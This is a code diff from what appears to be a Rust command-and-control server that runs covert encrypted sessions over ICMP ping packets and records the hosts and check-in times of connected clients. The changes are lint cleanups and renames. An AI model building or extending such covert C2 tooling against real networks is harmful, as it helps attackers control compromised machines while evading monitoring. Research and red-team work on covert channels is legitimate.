@@ -1,3 +1,4 @@
+#![deny(clippy::all, clippy::pedantic)]
 #![feature(slice_range)]
 #![feature(never_type)]
 mod environment;
@@ -9,7 +10,7 @@ use clap::Parser;
 use covert_c2_ping_common::{PingMessage, SessionData};
 use covert_common::CovertChannel;
 use lazy_static::lazy_static;
-use nft::NftRules;
+use nft::Rules;
 use rand::Rng;
 use std::{
     collections::HashMap,
@@ -25,10 +26,7 @@ use tokio::{
     task,
 };
 use tracing::{Instrument, Level};
-use workers::{
-    ping::{self, PingTransaction},
-    web,
-};
+use workers::{ping, web};
 
 #[derive(Parser)]
 #[clap(author, version, about, long_about = None)]
@@ -44,7 +42,7 @@ lazy_static! {
     static ref KEY: [u8; 32] = {
         let mut key = [0u8; 32];
         rand::thread_rng().fill(&mut key);
-        return key;
+        key
     };
     static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
         Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
@@ -79,8 +77,8 @@ async fn entry() -> Result<()> {
     tracing::info!("Key: {:02X?}", *KEY);
     tracing::info!("Starting...");
 
-    let web_h = task::spawn(web::web_worker());
-    let rules = NftRules::new().or_else(|err| {
+    let web_h = task::spawn(web::worker());
+    let rules = Rules::new().or_else(|err| {
         tracing::info!("{:?}", err);
         bail!("Failed to make rules");
     })?;
@@ -95,7 +93,7 @@ async fn entry() -> Result<()> {
         .instrument(tracing::span!(Level::INFO, "signal_handle")),
     );
 
-    let (downstream_sender, upstream_receiver, recv_h, send_h) = ping::start_ping_workers()?;
+    let (downstream_sender, upstream_receiver, recv_h, send_h) = ping::start_workers()?;
 
     let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));
 
@@ -113,17 +111,16 @@ async fn entry() -> Result<()> {
 
 #[tracing::instrument(skip_all)]
 async fn main_loop(
-    downstream_sender: mpsc::UnboundedSender<PingTransaction>,
-    mut upstream_reciever: mpsc::UnboundedReceiver<PingTransaction>,
+    downstream_sender: mpsc::UnboundedSender<ping::Transaction>,
+    mut upstream_receiver: mpsc::UnboundedReceiver<ping::Transaction>,
 ) -> Result<()> {
     loop {
         tracing::info!("Waiting for message");
-        let incoming_ping = match upstream_reciever.recv().await {
-            Some(ping) => ping,
-            None => {
-                tracing::info!("Upstream worker closed");
-                break;
-            }
+        let incoming_ping = if let Some(ping) = upstream_receiver.recv().await {
+            ping
+        } else {
+            tracing::info!("Upstream worker closed");
+            break;
         };
         let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
         let out_data: Vec<u8> = match channel_state {
@@ -134,13 +131,11 @@ async fn main_loop(
                     session_data.last_checkin = SystemTime::now()
                         .duration_since(UNIX_EPOCH)
                         .ok()
-                        .map(|v| v.as_secs_f64() * 1000.0);
+                        .map(|v| v.as_secs_f64() * 1_000.0_f64);
                     session_data.host = Some(incoming_ping.src_ip);
-                    if has_message {
-                        if let Err(_) = notify.send(()) {
-                            tracing::info!(channel = inc_chan, "channel closed");
-                            session_guard.remove(&inc_chan);
-                        }
+                    if has_message && notify.send(()).is_err() {
+                        tracing::info!(channel = inc_chan, "channel closed");
+                        session_guard.remove(&inc_chan);
                     }
                 } else {
                     tracing::info!(channel = inc_chan, "not a valid channel");
@@ -159,20 +154,20 @@ async fn main_loop(
             Err(e) => {
                 match e {
                     covert_common::CovertError::DecryptionError => {
-                        tracing::info!("Failed to decrypt packet")
+                        tracing::info!("Failed to decrypt packet");
                     }
                     covert_common::CovertError::InvalidHash => {
-                        tracing::info!("Invalid hash in packet")
+                        tracing::info!("Invalid hash in packet");
                     }
                     covert_common::CovertError::DeserializeError => {
-                        tracing::info!("Failed to deserialize packets to message")
+                        tracing::info!("Failed to deserialize packets to message");
                     }
                 }
                 continue;
             }
         };
 
-        let outgoing_ping = PingTransaction {
+        let outgoing_ping = ping::Transaction {
             src_mac: incoming_ping.dst_mac,
             dst_mac: incoming_ping.src_mac,
             src_ip: incoming_ping.dst_ip,
